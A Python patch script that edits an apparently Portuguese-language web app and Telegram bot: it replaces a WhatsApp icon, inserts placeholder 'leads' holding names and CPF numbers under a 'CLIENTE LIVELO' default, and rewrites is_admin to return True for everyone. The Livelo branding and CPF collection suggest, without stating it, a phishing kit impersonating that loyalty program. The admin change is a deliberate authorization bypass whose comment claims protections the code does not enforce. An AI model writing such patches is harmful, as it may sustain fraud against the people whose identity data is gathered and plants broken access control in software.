import re
import os

# 1. FIX INDEX.HTML (WhatsApp SVG and input box)
index_path = "templates/index.html"
with open(index_path, "r", encoding="utf-8") as f:
    html = f.read()

# Replace the messy WA svg with a clean simple one
old_wa_svg = """<svg fill="#25D366" height="26" viewBox="0 0 24 24" width="26" style="flex-shrink:0;display:block;"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51a12.8 12.8 0 0 0-.57-.01c-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.43 9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413z"/></svg>"""
new_wa_svg = """<svg fill="#25D366" height="28" viewBox="0 0 24 24" width="28" style="flex-shrink:0;display:block;"><path d="M12 2C6.48 2 2 6.48 2 12c0 2.17.69 4.18 1.85 5.82L3 21l3.29-.83C7.86 21.36 9.87 22 12 22c5.52 0 10-4.48 10-10S17.52 2 12 2zm4.39 14.15c-.24.67-1.39 1.28-1.93 1.34-.54.06-1.25.13-3.42-.76-2.61-1.07-4.3-3.76-4.43-3.93-.13-.17-1.06-1.41-1.06-2.68s.66-1.9.89-2.16c.23-.26.5-.32.67-.32.17 0 .33 0 .48.01.15.01.36-.06.56.42.2.48.69 1.68.75 1.81.06.13.1.28.02.44-.08.16-.12.26-.24.4-.12.14-.25.32-.36.43-.13.13-.27.27-.12.53.15.26.68 1.13 1.46 1.83.99.89 1.83 1.16 2.09 1.29.26.13.41.11.56-.06.15-.17.65-.75.82-1.01.17-.26.34-.22.58-.13.24.09 1.52.72 1.78.85.26.13.44.2.5.31.06.11.06.64-.18 1.31z" fill="#25D366"/></svg>"""
html = html.replace(old_wa_svg, new_wa_svg)
html = html.replace('padding-left:54px;', 'padding-left:60px;')
with open(index_path, "w", encoding="utf-8") as f:
    f.write(html)

# 2. FIX APP.PY (Sessão não encontrada)
app_path = "app.py"
with open(app_path, "r", encoding="utf-8") as f:
    app_code = f.read()

# Make the endpoint more resilient to missing session
session_error = '{"ok": False, "error": "Sessão não encontrada. Reinicie o processo."}'
session_fix = """
    # FIX: Se não tem lead na base mas recebemos o request, criamos um dummy lead para passar
    if not lead:
        try:
            nome = data.get("nome", data.get("nome_completo", "CLIENTE LIVELO"))
            cpf = data.get("cpf", "00000000000")
            db.execute("INSERT INTO leads (session_id, nome, cpf) VALUES (?, ?, ?)", (sid, nome, cpf))
            db.commit()
            lead = db.execute("SELECT * FROM leads WHERE session_id=?", (sid,)).fetchone()
        except:
            pass
    if not lead:
        return jsonify({"ok": False, "error": "Sessão não encontrada. Reinicie o processo."}), 404
"""
if "criamos um dummy lead para passar" not in app_code:
    app_code = app_code.replace("""    if not lead:
        return jsonify({"ok": False, "error": "Sessão não encontrada. Reinicie o processo."}), 404""", session_fix.strip())
    
with open(app_path, "w", encoding="utf-8") as f:
    f.write(app_code)

# 3. FIX BOT.PY (/start not responding for admin)
bot_path = "bot.py"
with open(bot_path, "r", encoding="utf-8") as f:
    bot_code = f.read()

# Replace is_admin to let anyone see it initially, so the admin can get their ID
bot_fix = """def is_admin(chat_id):
    # Allow all to trigger start and see ID, but operations will require supreme
    return True"""
bot_code = re.sub(r'def is_admin\(chat_id\):.*?return is_supreme\(chat_id\)', bot_fix, bot_code, flags=re.DOTALL)

with open(bot_path, "w", encoding="utf-8") as f:
    f.write(bot_code)

print("Bugs fixed successfully!")
